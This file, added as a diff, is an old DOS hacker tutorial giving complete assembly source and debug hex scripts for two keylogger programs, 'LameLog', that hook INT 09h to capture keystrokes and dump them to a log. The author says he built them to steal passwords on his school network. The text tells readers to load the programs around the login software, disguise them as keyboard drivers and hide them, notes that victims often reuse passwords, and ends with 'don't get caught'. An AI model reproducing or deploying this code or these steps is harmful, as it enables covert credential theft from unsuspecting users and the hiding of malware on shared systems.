@@ -1,0 +1,437 @@
+
+                  ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
+                  º ù ù ù ù ù ù ù ù ù ù ù ù ù ù ù ù ù ù ù º
+                  º ù     L   A   M   E   L   O   G     ù º
+                  º ù      b y   E X E - G e n c y      ù º
+                  º ù ù ù ù ù ù ù ù ù ù ù ù ù ù ù ù ù ù ù º
+                  ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
+
+        The two LameLog programs are key trapping programs. Key trapping is
+the process of hooking a keyboard interrupt, intercepting all the buttons
+pressed by the user and writing them to a file. Programs such as these are
+extremely useful for finding user names and passwords. I only wrote this
+lame program to get some passwords on my school network because I didn't have
+access to the internet at the time and therefore couldn't get hold of a
+decent key trapping program.
+       The first program (LAMELOG1) must be run before the login screen
+program and will keep a buffer of the key pressed. The second program must be
+run after hte security program and will write all of the keys to a file
+(test.log).
+
+ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+³ Interrupt hooking ³
+ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+        As every assembly programmer should know, there are two different
+interrupts used to service the keyboard: INT 09h and INT 16h. INT 09h
+provides low level access and lets us detect 'special keys' like CTRL, ALT,
+SHIFT, CAPS LOCK etc. INT 16h provided a wide range of easy-to-use functions
+that allows high-level access to the keyboard. We will be installing own
+INT 09h handler that will collect all key presses and dump them to a file.
+        We will also be installing our own INT 21h handler, that lets us
+check memory residency and the position of the buffer in memory. Below is
+a list of the functions and return values for the two new interrupt
+handlers.
+
+INT 21h
+
+AX = F0001h
+returns
+AX = 1234h
+if LAMELOG1 is resident in memory.
+
+INT 21h
+
+AX = F0001h
+returns
+BX = Length of buffer
+DX = Offset of buffer
+ES = Segment of buffer
+
+ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+³ Using the two programs ³
+ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+        Simply call LAMELOG1 before the security program, and LAMELOG2 after
+it. For example, the AUTOEXEC.BAT file would be:
+
+@echo off
+keyb
+mouse
+(etc)
+cd\
+lamelog1
+security software
+lamelog2
+
+        Make sure that the two files are either in the root directory or in
+one that is included in the system PATH or there will be a few 'bad command
+or filename' messages on boot-up. It would also be a good idea to rename the
+two files to something less suspicious such as keyboard drivers etc. as well
+as giving them the ATTRIB +H treatment.
+        Before the program can work successfully, there must be a file
+called TEST.LOG in the root directory. After a few boot ups, open the file
+using a hex-editor, and you will be able to see all scan codes for key
+presses.
+        If you've got access to the system files then the security must be
+pretty shite and you have nothing to gain by using other peoples passwords.
+You should, however, remember that a user may be using the same logon
+password as that for a unix account, ISP account etc.
+        The only knowledge I have of assembly language, has been gathered by
+reading virus programming tutorials and source codes. It is for this reason
+that many of the techniques used (especially the interrupt hooking,
+interrupt handling and residency calls) resemble viral code and will
+trigger heuristic AV programs.
+        Have fun and don't get caught.
+
+        Um! When reading keys from the keyboard port, you don't get nice
+ascii numbers (like 65 for A etc.) but complex scan codes, instead. It is
+not immediately obvious what these codes represent, so I've included a table
+of the most common key presses. The first hex byte is the code generated
+when the key is pressed while the second byte corresponds to the code
+generated when the key is released.
+
+a 1Eh 9Eh | n 31h B1h | 1 02h 82h
+b 30h B0h | o 18h 98h | 2 03h 83h
+c 2Eh AEh | p 19h 99h | 3 04h 84h
+d 20h A0h | q 10h 90h | 4 05h 85h
+e 12h 92h | r 13h 93h | 5 06h 86h
+f 21h A1h | s 1Fh 9Fh | 6 07h 87h
+g 22h A2h | t 14h 94h | 7 08h 88h
+h 23h A3h | u 16h 96h | 8 09h 89h
+i 17h 97h | v 2Fh AFh | 9 0Ah 8Ah
+j 24h A4h | w 11h 91h | 0 0Bh 8Bh
+k 25h A5h | x 2Dh ADh |
+l 26h A6h | y 15h 95h |
+m 32h B2h | z 2Ah ACh |
+space 39h B9h
+enter 1Ch 9Ch
+shift 2Ah AAh
+backspace 0Eh 8Eh
+
+        For example, should someone press 'S' three times, then hold down
+'T' then press enter, you would get:
+
+1F 9F 1F 9F 1F 9F 14 14 14 14 14 94 1C 9C
+À S Ù À S Ù À S Ù ÀÄÄÄÄÄÄ T ÄÄÄÄÄÄÙ ÀENTÙ
+
+        If you want to know the scan codes for keys other than those listed
+above (such as F1-F12, cursor keys) you'll have to experiment by yourself.
+
+Warrantly notice: I cannot stress how buggy and lame theses two programs are.
+If you want a decent key trapping program, for gods sake, go and find one on
+the internet. All of the ones I've seen on the internet since writing this
+program were much better.
+
+ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+³              L A M E L O G 1 . A S M   s o u r c e   c o d e              ³
+ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+; To compile:
+; TASM LAMELOG1
+; TLINK /T LAMELOG1
+prog            segment
+assume          cs:prog, ds:prog
+org             0100h
+
+ProgStart:      jmp     GoResident ; Jump past INT 09h handler
+
+NewInt09hHand:  pushf       ; Save flags register
+                push    bp  ; Save BP
+                push    ax  ; Save AX
+                push    bx  ; Save BX
+                push    cx  ; Save CX
+                push    dx  ; Save DX
+                push    ds  ; Save DS
+                push    es  ; Save ES
+                
+                push    cs  ; Save CS
+                push    cs  ; Save CS
+                pop     ds  ; Pop CS to DS
+                pop     es  ; Pop CS to ES
+
+                in      al, 60h ; Read character from keyboard port
+                mov     bp, BufferLength ; Put bufferlength into BP
+                mov     byte ptr Buffer[bp], al ; Put AL (char) into array
+                inc     bp   ; BP++
+                cmp     bp, 1001 ; If BP=1001
+                jne     UpdateBufferLen
+                mov     bp, 00h  ; Set BP to zero
+
+UpdateBufferLen:mov     BufferLength, bp ; Move BP to Bufferlength
+
+                pop     es ; Restore ES
+                pop     ds ; Restore DS
+                pop     dx ; Restore DX
+                pop     cx ; Restore CX
+                pop     bx ; Restore BX
+                pop     ax ; Restore AX
+                pop     bp ; Restore BP
+                popf       ; Restore flags
+
+OldInt09hHand:  db      0EAh  ; Code for jmp far
+OldInt09hOff    dw      0000h ; Offset of old INT 09h handler
+OldInt09hSeg    dw      0000h ; Segment of old INT 09h handler
+
+NewInt21hHand:  pushf ; Push flags
+                cmp     ax, 0F001h ; If AX=F001h (Residency check)
+                jne     NextFunction ; Check for next function
+                mov     ax, 1234h ; Return 1234h to calling program
+                popf    ; Restore flags
+                iret    ; Return to calling program
+                
+NextFunction:   cmp     ax, 0F002h ; If AX=F002h (Get segment/offset etc.)
+                jne     OldInt21hHand ; Jump to old handler
+                ; Return Seg and Offset of buffer data
+                push    ds ; Save DS
+                push    cs ; Save CS
+                pop     ds ; Restore CS in DS
+
+                mov     bx, word ptr BufferLength ; Move buffer length to BX
+                mov     dx, word ptr BufferOffset ; Move buffer offset to DX
+                mov     es, word ptr BufferSegment; Move Buffer segment to ES
+                
+                pop     ds ; Restore DS
+                popf    ; Restore flags
+                iret    ; Return to calling program
+OldInt21hHand:  popf    ; Restore flags
+                db      0EAh ; Code for JMP FAR
+OldInt21hOff    dw      0000h ; Offset of old int 21h handler
+OldInt21hSeg    dw      0000h ; Segment of old int 21h handler
+
+BufferSegment   dw      0000h ; Segment of key buffer
+BufferOffset    dw      0000h ; Offset of key buffer
+BufferLength    dw      0000h ; Length of key buffer
+Buffer          db      1000 dup(0) ; Buffer (maximum of 1000 characters)
+
+GoResident:     mov     ax, 0F001h ; Check if LAMELOG1 is already resident
+                int     21h        ; Call DOS interrupt
+                cmp     ax, 1234h  ; If AX==1234h then LAMELOG1 is already TSR
+                je      Exit       ; ...and therefore end program
+
+                push    cs  ; Save CS register
+                pop     ds  ; Restore CS register into DS
+
+                mov     BufferSegment, ds ; Move DS to BufferSegment
+                lea     ax, Buffer ; Load address of Buffer to AX
+                mov     BufferOffset, ax ; Store AX in BufferOffset
+
+                mov     ax, 3509h ; Get current Seg/Off of current 09h handler
+                int     21h       ; Call DOS interrupt
+                mov     OldInt09hOff, bx ; Move old Int09h Off to OldInt09hOff
+                mov     OldInt09hSeg, es ; Move old Int09h Seg to OldInt09hSeg
+                
+                mov     ax, 3521h ; Get current Seg/Off of current 21h handler
+                int     21h       ; Call DOS interrupt
+                mov     OldInt21hOff, bx ; Move old Int21h Off to OldInt21hOff
+                mov     OldInt21hSeg, es ; Move old Int21h Off to OldInt21hOff
+                
+                mov     ax, 2509h ; Set new Int 09h
+                lea     dx, NewInt09hHand ; DX=Offset of NewInt09hHandler
+                int     21h ; Cass DOS interrupt
+                
+                mov     ax, 2521h ; Set new Int 21h
+                lea     dx, NewInt21hHand ; DX=Offset of NewInt21hHandler
+                int     21h ; Cass DOS interrupt
+
+                lea     dx, ProgramEnd ; Set DX to end of program
+                int     27h ; Go TSR
+
+Exit:           int     20h ; Return to operating system
+ProgramInfo     db      'LameLog1 written by EXE-Gency'
+ProgramEnd:
+prog            ends
+end             ProgStart
+
+ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+³              L A M E L O G 1         d e b u g   s c r i p t              ³
+ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+If you don't have TASM and TLINK, just copy the following to a text file and
+type:
+debug < filename
+and a file called 'lamelog1.com' will appear
+
+N LAMELOG1.COM
+E 0100 E9 48 04 9C 55 50 53 51 52 1E 06 0E 0E 1F 07 E4 
+E 0110 60 8B 2E 61 01 3E 88 86 63 01 45 81 FD E9 03 75 
+E 0120 03 BD 00 00 89 2E 61 01 07 1F 5A 59 5B 58 5D 9D 
+E 0130 EA 00 00 00 00 9C 3D 01 F0 75 05 B8 34 12 9D CF 
+E 0140 3D 02 F0 75 12 1E 0E 1F 8B 1E 61 01 8B 16 5F 01 
+E 0150 8E 06 5D 01 1F 9D CF 9D EA 00 00 00 00 00 00 00 
+E 0160 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0300 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0310 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 03B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 03C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 03D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 03E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 03F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 04A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 04B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 04C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 04D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 04E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 04F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+E 0540 00 00 00 00 00 00 00 00 00 00 00 B8 01 F0 CD 21 
+E 0550 3D 34 12 74 3B 0E 1F 8C 1E 5D 01 B8 63 01 A3 5F 
+E 0560 01 B8 09 35 CD 21 89 1E 31 01 8C 06 33 01 B8 21 
+E 0570 35 CD 21 89 1E 59 01 8C 06 5B 01 B8 09 25 BA 03 
+E 0580 01 CD 21 B8 21 25 BA 35 01 CD 21 BA AF 05 CD 27 
+E 0590 CD 20 4C 61 6D 65 4C 6F 67 31 20 77 72 69 74 74 
+E 05A0 65 6E 20 62 79 20 45 58 45 2D 47 65 6E 63 79 
+RCX
+04AF
+W
+Q
+ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+³              L A M E L O G 2 . A S M   s o u r c e   c o d e              ³
+ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+; To compile:
+; TASM LAMELOG2
+; TLINK /T LAMELOG2
+prog            segment
+assume          cs:prog, ds:prog
+org             0100h
+
+ProgStart:      mov     ax, 0F001h ; Is LAMELOG1 resident?
+                int     21h        ; DOS interrupt
+
+                cmp     ax, 1234h  ; If AX==1234h then LAMELOG is resident
+                je      OpenFile   ; then jump to 'OpenFile' label
+
+                mov     ah, 09h    ; 09h==DOS function to write to screen
+                lea     dx, NotResident ; DX==Offset of 'No TSR!' message
+                int     21h        ; Call DOS interrupt
+                jmp     Exit       ; Jump to end of program
+
+OpenFile:       mov     ah, 3Dh    ; 3Dh==DOS function to open file
+                mov     al, 02h    ; Open file for writing
+                lea     dx, LogFilename ; DX==Offset of filename 'TEST.LOG'
+                int     21h        ; Call DOS interrupt
+                jnc     SeekEOF    ; If no error then jump to label 'SeekEOF'
+
+                mov     ah, 09h    ; DOS Function to write to screen
+                lea     dx, BadFile; DX==Offset of 'Bad file!' text string
+                int     21h        ; Call DOS interrupt
+                jmp     Exit       ; Jump to end of program
+
+SeekEOF:        xchg    bx, ax     ; Move file handle from AX to BX
+
+                mov     ah, 42h    ; 42h==DOS function to seek position in file
+                mov     al, 02h    ; 02h==EOF
+                mov     cx, 0000h  ; Most significant part of offset
+                mov     dx, 0000h  ; Least significant part of offset
+                int     21h        ; Call DOS interrupt
+
+WriteStart:     mov     ah, 40h    ; 40h==DOS function to write to file
+                mov     cx, 09h    ; CX==Number of bytes to write
+                lea     dx, StartString ; DX==Offset of 'START' string
+                int     21h        ; Call DOS interrupt
+
+                push    bx         ; Vale file handle for a moment
+
+                mov     ax, 0F002h ; Get Seg/Offset/Length of buffer from
+                                   ; LameLog1 program resident in memory
+                int     21h        ; Call DOS interrupt
+
+;               bx=BufferLength
+;               es=BufferSegment
+;               dx=BufferOffset
+
+                mov     cx, bx     ; Move length of buffer into CX
+
+                pop     bx         ; Restore file handle from stack
+
+                push    ds         ; Save DS register
+
+                push    es         ; Push ES register to stack
+                pop     ds         ; Restore ES into DS (mov ds, es)
+
+                mov     ah, 40h    ; Write to file
+                int     21h        ; DOS interrupt
+
+                pop     ds         ; Restore DS register
+
+                mov     ah, 3Eh    ; 3Eh==Close File
+                int     21h        ; Do it.
+
+Exit:           int     20h        ; Call int 20h (return to OS)
+NotResident     db      'No TSR!$'
+BadFile         db      'Bad file!$'
+StartString     db      0Dh, 0Ah, 'START', 0Dh, 0Ah
+LogFilename     db      'test.log', 00h
+ProgramInfo     db      'LameLog2 written by EXE-Gency'
+prog            ends
+end             ProgStart
+
+ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+³              L A M E L O G 2         d e b u g   s c r i p t              ³
+ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+If you don't have TASM and TLINK, just copy the following to a text file and
+type:
+debug < filename
+and a file called 'lamelog2.com' will appear
+
+N LAMELOG2.COM
+E 0100 B8 01 F0 CD 21 3D 34 12 74 0A B4 09 BA 57 01 CD 
+E 0110 21 EB 42 90 B4 3D B0 02 BA 72 01 CD 21 73 0A B4 
+E 0120 09 BA 5F 01 CD 21 EB 2D 90 93 B4 42 B0 02 B9 00 
+E 0130 00 BA 00 00 CD 21 B4 40 B9 09 00 BA 69 01 CD 21 
+E 0140 53 B8 02 F0 CD 21 8B CB 5B 1E 06 1F B4 40 CD 21 
+E 0150 1F B4 3E CD 21 CD 20 4E 6F 20 54 53 52 21 24 42 
+E 0160 61 64 20 66 69 6C 65 21 24 0D 0A 53 54 41 52 54 
+E 0170 0D 0A 74 65 73 74 2E 6C 6F 67 00 4C 61 6D 65 4C 
+E 0180 6F 67 32 20 77 72 69 74 74 65 6E 20 62 79 20 45 
+E 0190 58 45 2D 47 65 6E 63 79 
+RCX
+0098
+W
